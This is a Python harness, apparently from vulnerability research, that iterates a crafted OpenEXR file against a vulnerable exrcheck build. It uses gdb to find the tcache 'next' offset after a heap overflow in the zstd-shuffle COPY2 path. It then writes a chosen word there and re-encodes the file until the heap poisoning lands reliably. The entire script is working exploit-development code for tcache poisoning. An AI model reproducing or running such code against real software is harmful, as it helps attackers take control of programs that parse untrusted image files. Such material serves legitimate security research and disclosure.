#!/usr/bin/env python3
"""W192: iterate a shuffle-encoded COPY2 source at N=768/U=4N (COPY1 in
bounds).  Each pass reads the live destination bytes just before COPY2, sets
a chosen word at the currently observed tcache `next` offset, re-encodes the
bytes through the 2-byte unshuffle inverse, and regenerates the file.  The
file's compressed length moves the heap, so repeat until the head offset and
the chosen word agree in the same run.
"""
import hashlib
import pathlib
import re
import subprocess
import sys
ROOT = pathlib.Path(__file__).resolve().parent.parent
WORK = ROOT / "work-w192"
EV = ROOT / "evidence"
N, U = 768, 3072
POBF = WORK / "p0768.exr"
DUMP = WORK / "iter-pre-copy2.bin"
CHOSEN = 0x4141414141414141

def sha(p):
    return hashlib.sha256(p.read_bytes()).hexdigest()

def run(cmd, **kw):
    return subprocess.run(cmd, cwd=ROOT, capture_output=True, text=True, **kw)

def gen(seg1):
    run([sys.executable, "cases/make_poc_mixed_full.py", str(WORK / "baseline.exr"),
         str(POBF), str(N), "0x5a", str(U), seg1.hex()], check=True)

def probe():
    g = run(["gdb", "-q", "-batch",
             "-ex", "set pagination off", "-ex", "set confirm off",
             "-ex", "set disable-randomization on",
             "-ex", 'set $dumpfile = "%s"' % DUMP.relative_to(ROOT),
             "-ex", "break sort2_4ByteChannels_tiled",
             "-ex", "run -c " + str(POBF.relative_to(ROOT)),
             "-x", "harness/w192-preserve-probe.cmd",
             str(ROOT / "build-vuln-plain/bin/exrcheck")])
    out = g.stdout + g.stderr
    heads = re.search(r"WINDOW_HEADS=\[\((\d+), (\d+)\)\]", out)
    after = re.search(r"NEXT-AFTER-VAL=0x([0-9a-f]+)", out)
    return (int(heads.group(2)) if heads else None,
            int(after.group(1), 16) if after else None,
            "corruption" in out or "SIGABRT" in out)

WORK.mkdir(exist_ok=True)
run([str(ROOT / "bin-vuln-plain/gen_baseline_deep_mixed"),
     str(WORK / "baseline.exr")], check=True)
assert sha(WORK / "baseline.exr") == \
    "9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04"

lines = []
gen(bytes([0x5a]) * (2 * N))
for k in range(6):
    head, after, abort = probe()
    d = bytearray(DUMP.read_bytes())
    assert len(d) == 2 * N
    ok = bool(head is not None and 4 * N <= head <= 6 * N)
    lines.append("ITER=%d HEAD=%s AFTER=%s HIT=%s ABORT=%s POC=%s DUMP=%s" %
                 (k, head, "%016x" % after if after is not None else None,
                  ok, abort, sha(POBF), sha(DUMP)))
    if not ok:
        break
    off = head - 4 * N
    d[off:off + 8] = CHOSEN.to_bytes(8, "little")
    # inverse of exr_zstd_shuffle_decode_bytes for 2-byte elements
    seg1 = bytes(d[0::2]) + bytes(d[1::2])
    gen(seg1)

(EV / "w192-forge-iterations.out").write_text("\n".join(lines) + "\n")
print("\n".join(lines))
print("SHA256=%s" % sha(EV / "w192-forge-iterations.out"))
